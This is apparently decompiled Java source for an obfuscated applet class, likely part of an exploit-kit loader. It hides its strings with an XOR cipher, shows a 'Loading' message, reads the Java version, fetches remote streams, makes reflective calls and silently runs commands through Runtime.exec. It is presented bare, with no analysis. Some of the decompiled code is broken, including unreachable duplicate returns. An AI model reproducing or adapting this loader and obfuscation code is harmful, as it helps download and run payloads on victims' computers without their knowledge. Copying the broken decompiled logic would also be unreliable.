// 
// Decompiled by Procyon v0.5.30
// 

package ramblera;

import java.lang.reflect.Method;
import java.net.URL;
import java.io.InputStream;
import java.awt.Graphics;

public class ramblerb
{
    public static Class ramblere;
    public static String ramblerd;
    public static String ramblera;
    static int ramblerb;
    static int ramblerc;
    private static final String[] z;
    
    static {
        final String[] z2 = new String[7];
        final int n = 0;
        final char[] charArray = "FR?A5dZ".toCharArray();
        int length;
        int n3;
        final int n2 = n3 = (length = charArray.length);
        int n4 = 0;
        while (true) {
            Label_0098: {
                if (n2 > 1) {
                    break Label_0098;
                }
                length = (n3 = n4);
                do {
                    final char c = charArray[n3];
                    char c2 = '\0';
                    switch (n4 % 5) {
                        case 0: {
                            c2 = '\n';
                            break;
                        }
                        case 1: {
                            c2 = '=';
                            break;
                        }
                        case 2: {
                            c2 = '^';
                            break;
                        }
                        case 3: {
                            c2 = '%';
                            break;
                        }
                        default: {
                            c2 = '\\';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n4;
                } while (n2 == 0);
            }
            if (n2 > n4) {
                continue;
            }
            break;
        }
        z2[n] = new String(charArray).intern();
        final int n5 = 1;
        final char[] charArray2 = "`\\(Drf\\0BrIQ?V/".toCharArray();
        int length2;
        int n7;
        final int n6 = n7 = (length2 = charArray2.length);
        int n8 = 0;
        while (true) {
            Label_0214: {
                if (n6 > 1) {
                    break Label_0214;
                }
                length2 = (n7 = n8);
                do {
                    final char c3 = charArray2[n7];
                    char c4 = '\0';
                    switch (n8 % 5) {
                        case 0: {
                            c4 = '\n';
                            break;
                        }
                        case 1: {
                            c4 = '=';
                            break;
                        }
                        case 2: {
                            c4 = '^';
                            break;
                        }
                        case 3: {
                            c4 = '%';
                            break;
                        }
                        default: {
                            c4 = '\\';
                            break;
                        }
                    }
                    charArray2[length2] = (char)(c3 ^ c4);
                    ++n8;
                } while (n6 == 0);
            }
            if (n6 > n8) {
                continue;
            }
            break;
        }
        z2[n5] = new String(charArray2).intern();
        final int n9 = 2;
        final char[] charArray3 = "mX*f3dN*W)iI1W".toCharArray();
        int length3;
        int n11;
        final int n10 = n11 = (length3 = charArray3.length);
        int n12 = 0;
        while (true) {
            Label_0330: {
                if (n10 > 1) {
                    break Label_0330;
                }
                length3 = (n11 = n12);
                do {
                    final char c5 = charArray3[n11];
                    char c6 = '\0';
                    switch (n12 % 5) {
                        case 0: {
                            c6 = '\n';
                            break;
                        }
                        case 1: {
                            c6 = '=';
                            break;
                        }
                        case 2: {
                            c6 = '^';
                            break;
                        }
                        case 3: {
                            c6 = '%';
                            break;
                        }
                        default: {
                            c6 = '\\';
                            break;
                        }
                    }
                    charArray3[length3] = (char)(c5 ^ c6);
                    ++n12;
                } while (n10 == 0);
            }
            if (n10 > n12) {
                continue;
            }
            break;
        }
        z2[n9] = new String(charArray3).intern();
        final int n13 = 3;
        final char[] charArray4 = "`\\(Dr|X,V5eS".toCharArray();
        int length4;
        int n15;
        final int n14 = n15 = (length4 = charArray4.length);
        int n16 = 0;
        while (true) {
            Label_0446: {
                if (n14 > 1) {
                    break Label_0446;
                }
                length4 = (n15 = n16);
                do {
                    final char c7 = charArray4[n15];
                    char c8 = '\0';
                    switch (n16 % 5) {
                        case 0: {
                            c8 = '\n';
                            break;
                        }
                        case 1: {
                            c8 = '=';
                            break;
                        }
                        case 2: {
                            c8 = '^';
                            break;
                        }
                        case 3: {
                            c8 = '%';
                            break;
                        }
                        default: {
                            c8 = '\\';
                            break;
                        }
                    }
                    charArray4[length4] = (char)(c7 ^ c8);
                    ++n16;
                } while (n14 == 0);
            }
            if (n14 > n16) {
                continue;
            }
            break;
        }
        z2[n13] = new String(charArray4).intern();
        final int n17 = 4;
        final char[] charArray5 = "*\u001d~~\u0010/Ne".toCharArray();
        int length5;
        int n19;
        final int n18 = n19 = (length5 = charArray5.length);
        int n20 = 0;
        while (true) {
            Label_0562: {
                if (n18 > 1) {
                    break Label_0562;
                }
                length5 = (n19 = n20);
                do {
                    final char c9 = charArray5[n19];
                    char c10 = '\0';
                    switch (n20 % 5) {
                        case 0: {
                            c10 = '\n';
                            break;
                        }
                        case 1: {
                            c10 = '=';
                            break;
                        }
                        case 2: {
                            c10 = '^';
                            break;
                        }
                        case 3: {
                            c10 = '%';
                            break;
                        }
                        default: {
                            c10 = '\\';
                            break;
                        }
                    }
                    charArray5[length5] = (char)(c9 ^ c10);
                    ++n20;
                } while (n18 == 0);
            }
            if (n18 > n20) {
                continue;
            }
            break;
        }
        z2[n17] = new String(charArray5).intern();
        final int n21 = 5;
        final char[] charArray6 = "J[c".toCharArray();
        int length6;
        int n23;
        final int n22 = n23 = (length6 = charArray6.length);
        int n24 = 0;
        while (true) {
            Label_0678: {
                if (n22 > 1) {
                    break Label_0678;
                }
                length6 = (n23 = n24);
                do {
                    final char c11 = charArray6[n23];
                    char c12 = '\0';
                    switch (n24 % 5) {
                        case 0: {
                            c12 = '\n';
                            break;
                        }
                        case 1: {
                            c12 = '=';
                            break;
                        }
                        case 2: {
                            c12 = '^';
                            break;
                        }
                        case 3: {
                            c12 = '%';
                            break;
                        }
                        default: {
                            c12 = '\\';
                            break;
                        }
                    }
                    charArray6[length6] = (char)(c11 ^ c12);
                    ++n24;
                } while (n22 == 0);
            }
            if (n22 > n24) {
                continue;
            }
            break;
        }
        z2[n21] = new String(charArray6).intern();
        final int n25 = 6;
        final char[] charArray7 = ",Xc".toCharArray();
        int length7;
        int n27;
        final int n26 = n27 = (length7 = charArray7.length);
        int n28 = 0;
        while (true) {
            Label_0798: {
                if (n26 > 1) {
                    break Label_0798;
                }
                length7 = (n27 = n28);
                do {
                    final char c13 = charArray7[n27];
                    char c14 = '\0';
                    switch (n28 % 5) {
                        case 0: {
                            c14 = '\n';
                            break;
                        }
                        case 1: {
                            c14 = '=';
                            break;
                        }
                        case 2: {
                            c14 = '^';
                            break;
                        }
                        case 3: {
                            c14 = '%';
                            break;
                        }
                        default: {
                            c14 = '\\';
                            break;
                        }
                    }
                    charArray7[length7] = (char)(c13 ^ c14);
                    ++n28;
                } while (n26 == 0);
            }
            if (n26 > n28) {
                continue;
            }
            break;
        }
        z2[n25] = new String(charArray7).intern();
        z = z2;
        final char[] charArray8 = "nX8L2o~2D/y".toCharArray();
        int length8;
        int n30;
        final int n29 = n30 = (length8 = charArray8.length);
        int n31 = 0;
        while (true) {
            Label_1146: {
                if (n29 > 1) {
                    break Label_1146;
                }
                length8 = (n30 = n31);
                do {
                    final char c15 = charArray8[n30];
                    char c16 = '\0';
                    switch (n31 % 5) {
                        case 0: {
                            c16 = '\n';
                            break;
                        }
                        case 1: {
                            c16 = '=';
                            break;
                        }
                        case 2: {
                            c16 = '^';
                            break;
                        }
                        case 3: {
                            c16 = '%';
                            break;
                        }
                        default: {
                            c16 = '\\';
                            break;
                        }
                    }
                    charArray8[length8] = (char)(c15 ^ c16);
                    ++n31;
                } while (n29 == 0);
            }
            if (n29 > n31) {
                continue;
            }
            break;
        }
        ramblera.ramblerb.ramblerd = new String(charArray8).intern();
        final char[] charArray9 = "TZ;Q\u001ff\\-V\u0010e\\:@.".toCharArray();
        int length9;
        int n33;
        final int n32 = n33 = (length9 = charArray9.length);
        int n34 = 0;
        while (true) {
            Label_1262: {
                if (n32 > 1) {
                    break Label_1262;
                }
                length9 = (n33 = n34);
                do {
                    final char c17 = charArray9[n33];
                    char c18 = '\0';
                    switch (n34 % 5) {
                        case 0: {
                            c18 = '\n';
                            break;
                        }
                        case 1: {
                            c18 = '=';
                            break;
                        }
                        case 2: {
                            c18 = '^';
                            break;
                        }
                        case 3: {
                            c18 = '%';
                            break;
                        }
                        default: {
                            c18 = '\\';
                            break;
                        }
                    }
                    charArray9[length9] = (char)(c17 ^ c18);
                    ++n34;
                } while (n32 == 0);
            }
            if (n32 <= n34) {
                ramblera.ramblerb.ramblera = new String(charArray9).intern().substring(1);
                ramblera.ramblerb.ramblerb = 0;
                ramblera.ramblerb.ramblerc = 86;
                return;
            }
            continue;
        }
    }
    
    public void init(final String s) throws Throwable {
        ramblera.ramblere.ramblera();
        ramblera.ramblere.ramblerc(s);
    }
    
    public void ramblera(final Graphics graphics) {
        graphics.drawString(ramblera.ramblerb.z[0], 50, 25);
    }
    
    static boolean ramblerd(final String s) {
        final boolean ramblerm = ramblerf.ramblerm;
        final boolean contains = s.contains(ramblera.ramblerb.z[6].substring(1));
        if (!ramblerm) {
            if (contains) {
                final boolean contains2 = s.contains(ramblera.ramblerb.z[5].substring(1));
                if (!ramblerm) {
                    if (contains2) {
                        return true;
                    }
                }
            }
        }
        return contains;
    }
    
    public static char ramblera(final String s, final String s2) {
        return s.charAt(Integer.decode(s2));
    }
    
    public static Class ramblera(final Object o) throws Exception {
        return Class.forName((String)o);
    }
    
    public static String ramblera() {
        return System.getProperty(ramblera.ramblerb.z[3]);
    }
    
    static InputStream ramblere(final String s) throws Exception {
        return new URL(s).openStream();
    }
    
    public static Method ramblera(final Class clazz, final String s, final Class[] array) throws Exception {
        return clazz.getMethod(s, (Class[])array);
    }
    
    public static Object ramblera(final Method method, final Object o, final Object[] array) throws Exception {
        return method.invoke(o, array);
    }
    
    public static String ramblerb(final String s) {
        return String.format(ramblera(ramblera.ramblerb.z[4]), s);
    }
    
    public static String ramblera(final String s) {
        return s.trim();
    }
    
    public static void ramblerc(final String s) {
        try {
            Runtime.getRuntime().exec(s);
        }
        catch (Exception ex) {}
    }
    
    public static Object ramblera(final String s, final Class[] array) {
        try {
            final String s2 = ramblera.ramblerb.z[1];
            final String s3 = ramblera.ramblerb.z[2];
            try {
                final Object invoke = array;
                if (ramblerf.ramblerm) {
                    return invoke;
                }
                if (array != null) {
                    return ramblera((Object)s2).getMethod(s3, ramblera((Object)ramblerb(s2))).invoke(ramblera((Object)s), array);
                }
            }
            catch (Exception ex) {
                throw ex;
            }
            return ramblera((Object)s2).getMethod(s3, ramblera((Object)ramblerb(s2))).invoke(ramblera((Object)s), array);
            return ramblera((Object)s2).getMethod(s3, ramblera((Object)ramblerb(s2))).invoke(ramblera((Object)s), array);
        }
        catch (Exception ex2) {
            return null;
        }
    }
}
